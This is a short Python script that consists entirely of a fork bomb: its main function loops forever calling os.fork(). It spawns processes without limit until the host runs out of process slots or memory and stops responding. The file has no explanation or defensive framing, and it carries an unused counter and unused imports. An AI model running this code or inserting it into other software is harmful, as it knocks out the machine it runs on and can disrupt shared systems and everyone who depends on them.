#!/usr/bin/python
#

import sys
import time
import os

def main():
    
    count = 0
    while True:
        os.fork()
        
if __name__ == "__main__":
    main()
